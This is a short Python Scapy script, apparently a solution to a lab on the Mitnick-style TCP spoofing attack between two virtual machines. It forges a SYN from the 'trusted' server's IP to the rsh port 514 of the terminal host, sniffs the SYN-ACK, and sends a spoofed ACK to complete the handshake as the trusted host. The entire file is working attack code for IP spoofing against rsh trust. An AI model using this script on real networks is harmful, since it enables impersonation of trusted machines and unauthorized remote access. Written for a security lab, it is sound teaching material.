#!/usr/bin/python3
from scapy.all import *
VM_SERVER = "10.0.2.5"  # Host A's IP
VM_X_TERM = "10.0.2.6"  # Host B's IP
VM_X_TERM_MAC = "08:00:27:05:41:63"
bpf_filter = "tcp and src host " + VM_X_TERM + " and dst host " + VM_SERVER
X_PORT = 514
SRV_PORT = 1023
seq_num = 1000
ack_num = None
stop_sniffing = False
def response_syn_ack(pkt):
    global stop_sniffing
    global seq_num
    global ack_num
    if(pkt[TCP].flags == "SA"):
        e = Ether(dst = VM_X_TERM_MAC)
        a = IP()
        a.src = VM_SERVER
        a.dst = VM_X_TERM
        b = TCP()
        b.sport = SRV_PORT
        b.dport = X_PORT
        b.seq = seq_num + 1
        b.ack = pkt[TCP].seq + 1
        b.flags = "A"
        pkt = e/a/b
        sendp(pkt, verbose=0)
        stop_sniffing = True
def stop_condition(pkt):
    return stop_sniffing
##################send syn pkt
e = Ether(dst = VM_X_TERM_MAC)
a = IP()
a.src = VM_SERVER
a.dst = VM_X_TERM
b = TCP()
b.sport = SRV_PORT
b.dport = X_PORT
b.seq = seq_num
b.flags = "S"
pkt = e/a/b
sendp(pkt, verbose=0)
print("syn packet sent!!!!")
################################
#####################sniff_spoff (syn_ack response)
sniff(filter="tcp", prn=response_syn_ack, stop_filter=stop_condition)
print("syn_ack response sent!!!!")
#########################